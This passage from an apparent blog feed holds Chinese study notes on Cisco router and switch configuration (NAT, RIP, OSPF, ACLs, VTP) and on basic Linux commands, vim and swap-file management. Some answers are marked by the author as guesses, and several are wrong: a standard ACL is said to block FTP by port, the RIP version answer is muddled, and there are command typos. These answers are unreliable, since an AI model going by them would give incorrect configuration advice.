命令中，如果使用参数overload，实验结果与本实验有什么区别？</strong></p><ul><li><p>使用参数overload，意味使用PAT（网络地址端口转换）技术，可将多个内部地址映射为一个合法公网地址,但以不同的协议端口号与不同的内部地址相对应 </p></li><li><p> 内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问 </p></li><li><p> ip nat inside source list 10  pool MYNAT overload </p></li></ul><p>  <strong><del>此外内容需要在仿真上做一遍，我还没弄</del></strong></p></li></ol><h4 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h4><p><strong>RIP路由协议</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">Router rip# 启动RIPnetwork 1.0.0.0network 12.0.0.0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OSPF路由协议</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router ospf <span class="token number">1</span><span class="token comment"># 启动ospf协议</span>Network <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span>Network <span class="token punctuation">[</span>网络号<span class="token punctuation">]</span> <span class="token punctuation">[</span>反掩码<span class="token punctuation">]</span> <span class="token punctuation">[</span>路由区域<span class="token punctuation">]</span>Network <span class="token number">12.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检查OSPF路由协议的命令</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Show ip ospf neighbor    &#x2F;&#x2F; 显示现在的Ospf邻居，其中包括邻居ID（Route-id)、优先级、状态、存活时间、IP地址、接口Show ip osfp interface    &#x2F;&#x2F;查看接口是否被加入到正确的区域中，该命令还可以显示各种定时器hello间隔等和邻居关系。Show ip route ospf    &#x2F;&#x2F;显示路由器知道的OSPF路由Show ip ospf database    &#x2F;&#x2F;查看OSPF数据库，包括各种LSA的数据状态Clear ip ospf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>动态路由协议的配置主要包含哪两个步骤？</p><blockquote><p><del>配置各路由器、PC的相关配置和配置路由协议（我猜的，没找到确切答案）</del></p></blockquote></li><li><p>通过RIP协议的调试步骤，可以得出RIP路由表的默认更新时间约是多少？</p><ul><li>RIP路由协议默认更新周期是30秒</li></ul></li><li><p>OSPF协议通过那条命令可以获得路由器的ID？</p></li></ol><ul><li>show ip protocols</li></ul><ol start="4"><li><p>如果两台路由器一台运行RIP第1版，一台运行第2版，两台主机是否可以ping通？通过使用show ip route 查看两台路由器的路由表，确定版本1与版本2之间究竟谁可以接受谁的路由更新？（单边邻居关系）</p><blockquote><p style="color:blue;">两台主机不能ping通，RIP版本1可以接受版本2，因为RIPv2需要包含子网掩码，而版本1并不含有子网掩码，版本1的协议发往版本2后，版本2会将该报文丢弃，而当版本1接受到版本2的报文时，版本1会收下版本2的报文</p></blockquote></li></ol><h4 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h4><pre class="line-numbers language-、" data-language="、"><code class="language-、">access-list[list number][permit&#x2F;deny][source address][address][wildcard mask][log]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>标准ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> deny host <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.2</span><span class="token comment"># 拒绝来自1.1.1.2的主机通过</span><span class="token comment"># 可以利用关键字"host"来代表通配符掩码0.0.0.0,表示一台主机</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> permit <span class="token builtin">any</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">1</span> out<span class="token comment"># 访问列表的出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拓展ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> deny tcp <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> <span class="token number">2.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> eq telnet<span class="token comment"># telnet使用的是TCP的23号端口、eq其实是等于....</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> permit tcp <span class="token builtin">any</span> <span class="token builtin">any</span><span class="token comment"># 这两条语句的顺序;访问表语句的处理顺序是由上到下的。如果我们将两个语句顺序颠倒，将permit语句放在deny语句的前面，则我们将不能过滤来自主机地址的报文</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">101</span> <span class="token keyword">in</span><span class="token comment">#访问控制列表 出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>根据本次实验，你认为ACL一般有哪些配置步骤？</p><p><strong><del>跟上面那个动态路由一样，我没弄出来</del></strong></p></li><li><p>在步骤4中，如果要使得1.0.0.0整个网络无法访问2.0.0.0该如何配置？</p><ul><li>可以使用Access-list 1 deny 指令阻止整个网段的访问</li></ul></li><li><p>在步骤5中，虽然禁止的是telnet，但此时PC1是否可以ping通PC2?为达到ping通的目的，应该如何处理？</p><ul><li>ping 命令通过ICMP协议进行报文传输，在访问控制类别中没有运行ICMP或者IP报文的访问，所以ping指令也无法通信。</li></ul></li><li><p>禁止FTP应该如何配置访问控制列表？</p><ul><li>通过access-list 1 deny命令禁止代表FTP协议的21号端口即可禁止FTP</li></ul></li></ol><h4 id="VTP"><a href="#VTP" class="headerlink" title="VTP"></a>VTP</h4><p><strong>配置级联接口的Trunk封装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">switchport trunk encapsulation dot1q<span class="token comment">#接口的trunk封装802.1Q协议，用于启用trunk</span>switchport mode trunk<span class="token comment">#设置接口模式为trunk模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置交换机的工作模式</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">vtp mode <span class="token punctuation">[</span>server<span class="token operator">/</span>client<span class="token operator">/</span>transparent<span class="token punctuation">]</span> <span class="token comment">#分别是服务器，客户端和透明模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>VTP服务器控制着它们所在域中VALN的生成和修改</li><li>VTP客户机不允许管理员创建、修改或删除VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们的VTP配置情况</li><li>VTP透明模式中的交换机不参与VTP，交换机处于透明模式时，不通告其VLAN配置信息。它的VLAN数据库更新与收到的通告也不保持同步。可以创建和删除本地的VLAN。这些VLAN的变更不会传播到其他任何交换机上</li></ul><p><strong>更改交换机的域名</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch (config)# vtp domain qrnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果将S2的工作模式更改为透明模式，S2是否会学习S1的VLAN划分？<ul><li>不会，透明模式不会学习服务器的配置</li></ul></li></ol><h3 id="押题："><a href="#押题：" class="headerlink" title="押题："></a>押题：</h3><h4 id="三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703"><a href="#三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703" class="headerlink" title="[三层交换实现VLAN间通信][https://blog.csdn.net/weixin_47678542/article/details/121749703]"></a>[三层交换实现VLAN间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121749703]">https://blog.csdn.net/weixin_47678542/article/details/121749703]</a></h4><p>[路由器实现Vlan间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121844112]">https://blog.csdn.net/weixin_47678542/article/details/121844112]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络工程——CISCO设备基本语法&quot;&gt;&lt;a href=&quot;#网络工程——CISCO设备基本语法&quot; class=&quot;headerlink&quot; title=&quot;网络工程——CISCO设备基本语法&quot;&gt;&lt;/a&gt;网络工程——CISCO设备基本语法&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="Cisco" scheme="https://shierjinghuang.github.io/tags/Cisco/"/>
    
  </entry>
  
  <entry>
    <title>Linux 知识点汇总</title>
    <link href="https://shierjinghuang.github.io/2023/02/10/Linux/"/>
    <id>https://shierjinghuang.github.io/2023/02/10/Linux/</id>
    <published>2023-02-10T03:56:43.000Z</published>
    <updated>2023-03-05T08:48:37.853Z</updated>
    
    <content type="html"><![CDATA[<h2><center>Linux 知识点汇总</center></h2>[TOC]<h4 id="P4-Linux的基本特征-8个"><a href="#P4-Linux的基本特征-8个" class="headerlink" title="P4: Linux的基本特征 8个"></a>P4: Linux的基本特征 8个</h4><ul><li><strong>开放性</strong>：系统遵循世界标准规范，特别是遵循开放系统互连(OSI) 国际标准 </li><li><strong>多用户</strong>：系统资源可以被不同的用户各自拥有使用。每个用户对自己的资源有特定的权限，互不影响。</li><li><strong>多任务</strong>：计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器</li><li><strong>快速性</strong>：Linux 不大在意CPU的速度，它可以把处理器的性能发挥到极限</li><li><strong>安全性</strong>：Iinux 采取了许多安全技术措施，包括对读、写进行权限控制，带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障</li><li><strong>网络性</strong>：Linux 是在Internet的基础上产生并发展起来的，因此，完善的内置网络是Linux的一大特点。</li><li><strong>移植性</strong>：Linux能够在从微型计算机到大型计算机的任何环境中和任何平台上运行。</li><li><strong>兼容性</strong>：Linux是一款与POSI (Portable Operating System Interface)相兼容的操作系统，它所构成的子系统支持所有相关的ANSI、ISO、 IETF 和W3C业界标准。</li></ul><h4 id="P25-26-关机与注销"><a href="#P25-26-关机与注销" class="headerlink" title="P25-26: 关机与注销"></a>P25-26: 关机与注销</h4><ol><li><p>从图形界面关机：右上角齿轮</p></li><li><p>从命令行关机</p><ul><li><p><strong>关机命令 shutdown</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># shutdown //要等待一会儿</span><span class="token comment"># shutdown +5 //5min后关机</span><span class="token comment"># shutsown 19:20 //19：20关机</span>-f/-F 重新启动时执行/不执行fsck-k 仅送出信息给所有用户，不会实际关机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>注销命令 exit</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">exit</span> <span class="token punctuation">[</span>状态值<span class="token punctuation">]</span>// <span class="token number">0</span>表示执行成功，其他值表示失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>重启命令 reboot</p><pre class="line-numbers language-none"><code class="language-none">-d 重启时不把数据写入记录文件-n 重开机前不检查有未结束的程序-w 仅测试不重启，把数据写入记录文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p><strong>（第三章 考试重点）</strong></p><h4 id="P57-Shell常用特殊符号-7个"><a href="#P57-Shell常用特殊符号-7个" class="headerlink" title="P57: Shell常用特殊符号 7个"></a>P57: Shell常用特殊符号 7个</h4><ul><li>“ ***** “ 表示一个(包括空字符)或多个字符组成的字符串</li><li>“ <strong>?</strong> “ 表示单个字符</li><li>“ <strong>[]</strong> “ 用于指定显示内容范围</li><li>“ <strong>!</strong> “ 用于指定不显示内容，与” <strong>[]</strong> “一同使用</li><li>“ <strong>;</strong> “ 用于同一行中分隔多个命令</li><li>“ <strong>`</strong> “ 命令替代符，包含内容在Shell中为一条命令，并被执行</li><li>“ <strong>#</strong> “ 注释符号，该行内容不被执行</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l /bin/e*  //查看/bin目录下的e开头的所有文件和文件夹<span class="token function">ls</span> -l /bin/e？ //查看e开头，长度为2的所有文件和文件夹<span class="token function">ls</span> <span class="token punctuation">[</span>a-c<span class="token punctuation">]</span>  //为a b c的文件和文件夹<span class="token function">ls</span> <span class="token punctuation">[</span><span class="token operator">!</span>a-c<span class="token punctuation">]</span>     //显示名不为为a b c的文件和文件夹<span class="token function">ls</span> -l  //显示目录下的文件和文件夹和查看其详细信息<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -l<span class="token variable">`</span></span>  //字符串输出为指令执行结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P57-Shell常用操作-4个"><a href="#P57-Shell常用操作-4个" class="headerlink" title="P57: Shell常用操作 4个"></a>P57: Shell常用操作 4个</h4><ul><li><p>自动命令补全功能 ——TAB键</p></li><li><p>自动输入历史命令 ——history命令</p></li><li><p>重定向</p><p>  让用户从文件输入命令，或将输出结果存储在文件及设备中，不需要输入输出设备</p><ul><li>输出重定向符**”&gt;”(写入并覆盖)<strong>和</strong>“&gt;&gt;”(追加)**，输入重定向符”&lt;”</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l <span class="token operator">></span> <span class="token builtin class-name">test</span> //将执行结果写入test文件中，没有test就自动创建//显示器无结果表示重定向成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>管道</p><blockquote><p>管道是一种通信机制，是一种特殊文件，可以进行读写。</p></blockquote><blockquote><p>除首尾的两个命令，每一个命令的输入都来自前一个命令的输出</p></blockquote><blockquote><p>“ <strong>|</strong> “ 将多个简单命令结合在一起，实现复杂的功能</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -l <span class="token operator">|</span> <span class="token function">grep</span> <span class="token builtin class-name">test</span> //查看当前目录下test的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P61-Shell常用命令-10个"><a href="#P61-Shell常用命令-10个" class="headerlink" title="P61: Shell常用命令 10个"></a>P61: Shell常用命令 10个</h4><p>（第四题考 书上命令要很了解）</p><ul><li><p><strong>ls 查看指定工作目录下的内容</strong></p><blockquote><p style="color:blue;">ls [选项] [路径]</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> -a/-A 显示所有文件及目录，列出/不列出隐藏文档<span class="token punctuation">(</span>隐藏文档名称开头有<span class="token string">"."</span><span class="token punctuation">)</span><span class="token function">ls</span> -l 除文件名外，显示详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd 查看当前工作目录的绝对路径</strong></p></li><li><p><strong>uname 查看当前系统内核信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">uname</span> 显示内核名<span class="token function">uname</span> -r 显示内核版本号<span class="token function">uname</span> -o 显示系统信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd 切换目录</strong></p><blockquote><ul><li><p style="color:blue;">cd [路径]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> / //切换到/目录<span class="token builtin class-name">cd</span> ~ //切换到当前用户主目录<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span> //切换到上一级目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cat 显示文件内容</strong></p><blockquote><ul><li><p style="color:blue;">cat [选项] [文件] </p></li></ul></blockquote></li><li><p><strong>clear 清屏</strong></p></li><li><p><strong>sudo 切换用户身份执行</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$sudo</span> adduser Me //以root用户运行adduser命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>su 切换用户</strong></p><blockquote><ul><li><p style="color:blue;">sudo    [选项] [命令]    </p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$sudo</span> <span class="token function">su</span> root //切换到root用户<span class="token comment">#su Me //切换到Me用户</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>ifconfig 显示和配置网络设备属性</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">interface 网络接口的名称，如eth0<span class="token punctuation">(</span>网卡<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 //查看eth0的网络情况<span class="token function">ifconfig</span> eth0 up/down //激活或关闭eth0<span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.0.25 netmask <span class="token number">255.255</span>.255.0 //设置eth0的IP地址和子网掩码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>man 系统帮助(命令的详细内容和使用方法)</p><blockquote><ul><li><p style="color:blue;">man [命令名]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">man ls &#x2F;&#x2F;查看ls命令的详细内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="P65-96-编辑器-2个"><a href="#P65-96-编辑器-2个" class="headerlink" title="P65-96: 编辑器 2个"></a>P65-96: 编辑器 2个</h4></li></ul><p>(编辑器的基本使用，考察，至少知道哪个是编辑器)</p><p><strong>1.Gedit编辑文档</strong></p><p>窗口四个部分：菜单栏、工具栏、文档编辑栏、状态栏</p><p>菜单栏：文件、编辑、查看、搜索、工具、文档、帮助</p><ul><li>文件：新建、打开、保存、保存为、还原、打印预览、打印、关闭、推出</li><li>编辑：撤销、重做、剪切、复制、粘贴、删除、全部选中、插入日期和时间、首选项</li><li>查看：……</li></ul><pre class="line-numbers language-none"><code class="language-none">gedit test.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>“+” 前台运行</p><p>“&amp;” 后台运行，进入自己的编辑器 </p></blockquote><p><strong>2.VIM的使用和配置</strong></p><p><strong>3种工作模式：输入模式、指令模式、底行模式</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> <span class="token builtin class-name">test</span> //光标置于最后一行<span class="token function">vim</span> n <span class="token builtin class-name">test</span> //光标置于第n行<span class="token function">vim</span> pattern <span class="token builtin class-name">test</span> //光标置于第一个与pattern匹配的串处<span class="token function">vim</span> -r <span class="token builtin class-name">test</span> //发生系统崩溃，恢复文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>只读模式切输入模式</p><pre class="line-numbers language-none"><code class="language-none">i 光标前(光标在第一行第一列)a 光标后(光标在第一行第二列)I 当前行首A 当前行尾o&#x2F;O 当前行之下&#x2F;上新开一行r 替换当前字符……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>输入模式切指令模式 <strong>Ecs键</strong></p><pre class="line-numbers language-none"><code class="language-none">移动光标类指令：光标上移一行 k ; 光标下移一行 j光标左移一字符 h ; 光标右移一字符 l……屏幕翻滚类指令：Ctrl+u 文件首翻半屏……复制、删除、粘贴类指令：……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>指令模式切底行模式  <strong>: 或 ? 或 /</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;pattern 从光标开始处向文件尾搜索pattern?pattern 从光标开始处向文件首搜索pattern:w 保存  :x 保存并退出  :q 退出  :! 强制退出:q! 不保存文件并退出:wq 保存并退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>VIM配置</strong></p><p>定制VIM编辑器属性方便编写文档，配置文件地址为/etc/vim/vimrc，该文件会在启动时读取，该命令为底行模式命令，命令写入文件后使用时不必重复键入命令</p><p>更新最新vim版本(vim,vim-common,vim-doc,vim-runtiem)，切换到root权限下，打开vim配置文件(vim /etc/vim /vimrc)，将需要命令前的注释键#删除。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">syntax on 关键字高亮<span class="token builtin class-name">set</span> <span class="token assign-left variable">tabstop</span><span class="token operator">=</span><span class="token number">4</span> 按下tab键跳跃4个光标<span class="token builtin class-name">set</span> <span class="token assign-left variable">background</span><span class="token operator">=</span>dark 更改背景为深色……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P77-挂载"><a href="#P77-挂载" class="headerlink" title="P77: 挂载"></a>P77: 挂载</h4><p>挂载：在Linux或UNIX系统中，<strong>任何个种类的文件系统被创建后，都需要挂载到某个特定的目录才能使用，这个过程相当于激活一个文件系统</strong>，使它能够被使用。</p><p>Linux使用<strong>mount工具</strong>来对文件系统进行挂载。挂载文件系统时需要明确挂载点，比如在安装Ubuntu的过程中，读者实际上已经接触过挂载的过程了，在创建文件系统后，操作系统会提示将此文件系统挂载至哪个位置，而这个位置就是挂载点，在那个时候，通常都选择挂载点为“/”，即根目录。此外，还可以利用该工具挂载其他种类的文件系统，也需要涉及挂载点的选择，挂载点的实质是一个空置的目录。</p><p>Windws文件系统的挂获原理是将磁盘分成若干分区，在各个分区中挂载文件系统。而Linux的挂载原理与Windows不同，它是将磁盘空间挂载在一个目录下。</p><h4 id="P81-swap交换分区"><a href="#P81-swap交换分区" class="headerlink" title="P81: swap交换分区"></a>P81: swap交换分区</h4><ul><li><p>什么是交换分区？</p><ul><li>在Linux中，交换分区是“虚拟内存”技术的集中体现。它代替了Windows中交换文件的概念，但实质都是<strong>利用硬盘空间，临时当作内存使用</strong></li><li>虚拟内存在功能上突破了物理内存的限制，是程序可以操纵大于实际物理内存的空间，更重要的是，虚拟内存是隔离每个进程的安全保护网，可以使每个进程都不受其他程序的干扰</li></ul></li><li><p><font color=Brown>怎么交换？有什么功能？交换多少合适？</font></p><ul><li><p>当系统的物理内存不够用的时候，才进行分区的交换。将物理内存中的一部分空间释放出来，以供当前运行的程序使用，被释放的空间的程序被临时保存到交换分区中，等到那些程序要运行时，再从交换分区中恢复保存的数据到内存中。被释放的空间可能来自一些很长时间没有什么操作的程序。</p></li><li><p>分配太多的交换分区会浪费磁盘空间，而交换分区太少，系统则会发生错误。通常情况下，交换分区应<strong>大于或等于物理内存的大小</strong>，最小<strong>不应小于64M</strong>，通常交换分区得大小应是物理内存(虚拟机的)得<strong>2~2.5倍</strong>。</p><blockquote><ul><li><p>不是所有物理内存中交换出来的数据都会被放到交换分区中，会导致不堪负重，有相当一部分数据会被直接交换到文件系统，如文件读写</p></li><li><p>交换分区是”匿名“内存数据的交换空间。”匿名“内存数据如malloc和new函数生成的对象的数据，以及堆栈中一些状态和变量数据等。malloc和new函数生成的对象的数据，即人为在内存上进行的空间操作，它们在文件系统中没有相应的”存储“文件，需要交换分区。</p></li></ul></blockquote></li></ul></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># swapon -s //查看当前系统的交换分区情况</span>Filename表示当前交换分区挂载的位置，Type表示该分区的文件格式，partition表示交换分区，/dev/sda5表示第一块硬盘的第一个扩展分区的第一个逻辑磁盘/dev/hda, /dev/hdb, /dev/sda, /dev/sdbhda一般是指IDE接口的硬盘，hda指第一块硬盘，hdb指第二块硬盘,等等；sda一般是指SATA接口的硬盘，sda指第一块硬盘，sdb指第二块硬盘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>交换分区的数量对性能有很大的影响。因为分区的交换操作是磁盘I/O的操作，多个交换分区可以轮流使用，均衡I/O的负载，而单一交换分区会很忙使系统大多数时间处于等待状态，效率很低。系统很慢，但CPU不忙，说明问题在I/O上。</li></ul><p><strong>交换分区的管理</strong></p><p>交换分区是分页管理的，每一页的大小和内存也得大小一样，以方便数据交换。</p><blockquote><p>旧版本实现交换分区，用交换分区第1页作为所有交换分区的一个”映射“，即第1页的每一位都对应一页交换分区。如果这一位是1，表示此页可用；如果这一位是0，表示此页是环块，不可用。</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">vmstat</span> <span class="token number">3</span>  //每3秒捕获一次系统性能指标Procs下的r表示正在等待的进程数量（等待块），b表示输入输出Memory下的swpd表示使用的Swap空间的大小Swap下的si表示系统的交换回内存的总量，so表示CPU每秒交换总量以上指标的数值越大，表示系统越繁忙，其繁忙程度与系统具体的配置有关。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230209224236885.png"></p><p><font color="red"><strong>交换分区常用管理方法</strong></font> </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>.切换为超级用户（管理员），cd到/root目录下<span class="token function">sudo</span> <span class="token function">su</span> root<span class="token builtin class-name">cd</span> /root<span class="token number">2</span>.创建一个swap文件（有连续空间的），其路径为/root/swapfile<span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">of</span><span class="token operator">=</span>/root/swapfile <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1024</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">65536</span><span class="token punctuation">(</span>ls //存在一个snap和swapfile文件<span class="token punctuation">)</span><span class="token number">3</span>.格式化swap分区<span class="token function">mkswap</span> swapfile //将刚才建立的/root/swapfile文件格式化为swap格式<span class="token number">4</span>.激活swap分区<span class="token function">swapon</span> swapfile<span class="token number">5</span>.检查刚建立的交换分区文件是否存在<span class="token function">swapon</span> -s<span class="token number">6</span>.回收/root/swapfile文件所占用的交换空间swapoff swapfile<span class="token number">7</span>.删除/root/swapfile文件<span class="token function">rm</span> swapfile<span class="token punctuation">(</span>永久创建 <span class="token function">vim</span> /etc/fstab<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="P88-91-压缩和解压-3个"><a href="#P88-91-压缩和解压-3个" class="headerlink" title="P88-91: 压缩和解压 3个"></a>P88-91: 压缩和解压 3个</h4><ul><li><p><strong>zip和unzip</strong></p><ul><li><p>zip命令一般解压有规则特征的应用程序</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">zip</span> -m abc.zip a b c //-m:压缩后，删除原始文件<span class="token punctuation">(</span>将文件移入压缩文件<span class="token punctuation">)</span> <span class="token function">zip</span> -r test.zip test/ //-r:递归处理，压缩指定目录下的所有文件和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>unzip解压</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">unzip</span> abc.zip //直接解压，压缩文件依然存在<span class="token function">unzip</span> -d test1 abc.zip //-d<span class="token operator">&lt;</span>目录<span class="token operator">></span>:指定文件解压后的存储目录，没有的话新建<span class="token function">unzip</span> abc.zip -x a //-x<span class="token operator">&lt;</span>文件<span class="token operator">></span>：指定压缩文件中不解压的文件<span class="token function">unzip</span> -l abc.zip //-l:显示压缩文件所包含的文件<span class="token function">unzip</span> -Z abc.zip //-Z:显示压缩文件中文件的具体信息，不解压<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>tar解压规则/不规则程序</strong></p><p>（1）-cvf：文件归档但不压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps15.jpg" alt="img" style="zoom: 67%;" /> </center>（2）gzip压缩和解压缩 -z</li></ul><p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps16.jpg" alt="img" style="zoom: 67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps17.jpg" alt="img" style="zoom:67%;" /> </center>（3）bzip2压缩和解压缩 -j<p>-c：压缩；-x：解压缩</p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps18.jpg" alt="img" style="zoom:67%;" /> </center>  <center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps19.jpg" alt="img" style="zoom:67%;" /> </center>#### P92：文件系统管理命令 6类20个<ol><li><p>文件的基本操作</p><ul><li><p><strong>touch 创建一个新文件，存在则修改文件最后修改日期</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">touch</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span><span class="token function">touch</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp 复制一个或多个文件，也可以复制一个目录</strong></p><blockquote><ul><li><p style="color:blue;">touch [参数] [源地址] 